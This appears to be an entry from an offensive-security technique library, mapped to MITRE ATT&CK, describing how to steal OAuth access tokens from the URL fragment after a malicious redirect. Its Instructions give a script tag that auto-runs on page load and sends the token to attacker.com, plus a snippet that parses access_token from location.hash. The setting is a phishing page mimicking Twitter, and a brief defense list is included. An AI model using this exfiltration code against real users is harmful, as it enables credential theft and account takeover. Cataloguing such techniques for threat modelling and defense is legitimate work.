---
tags:
  - token-extraction
  - javascript
type: procedure
tools: []
tactics:
  - '[[Credential Access]]'
commands:
  - '[[commands/extract-token-from-location-hash]]'
platforms:
  - Web
techniques:
  - '[[Credentials In Files]]'
skill_level: beginner
impact_level: high
detection_risk: low
sub_techniques: []
id: 28c44758-71ae-450a-bdb1-264a7c21ba16
created_at: '2025-12-14T17:24:35.759Z'
updated_at: '2025-12-14T17:24:35.759Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Credential Access]]'
mitre_techniques:
  - '[[Credentials In Files]]'
---
# Extract-OAuth-Token-from-URL-Hash

## Summary

This procedure uses JavaScript on an attacker-controlled page to read the OAuth access_token from the URL fragment after the malicious redirect, enabling exfiltration and use of the token.

## Description

Post-OAuth redirect, the URL lands on attacker.com#access_token=STOLEN_TOKEN. JavaScript parses location.hash to extract it. Scenario: Embed script in a phishing page mimicking Twitter; token can then access Outlook APIs.

## Requirements

1. Control over the redirect target domain
2. Basic JavaScript knowledge
3. Server to receive exfiltrated token

## Defense

Defensive measures and detection strategies:

- Avoid tokens in URL fragments; use POST redirects
- Monitor for token usage from unexpected IPs
- Browser extensions to warn on hash-based leaks

## Objectives

1. Capture the access_token immediately on load
2. Exfiltrate to attacker for further use
3. Validate token for API access

## Instructions

### Step 1: Load Attacker Page

**Context**: Ensure the page auto-executes token extraction on load.

Embed in HTML: <script>fetch('https://attacker.com/log?token=' + location.hash.split('=')[1]);</script>

### Step 2: Extract via Console or Script

**Context**: Manually or automatically parse the hash.

**Command** ([[commands/extract-token-from-location-hash]]):
```javascript
let token = location.hash.match(/access_token=([^&]+)/)?.[1];
console.log(token);
```

> Expected output: The raw access_token string.

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access]] Credential Access

### Techniques

- [[Credentials In Files]] Credentials In Files

### Sub-Techniques

- None

## Commands Used

- [[commands/extract-token-from-location-hash]]

## Tools Used

- None

## Tags

- [[token-extraction]]
- [[JavaScript]]
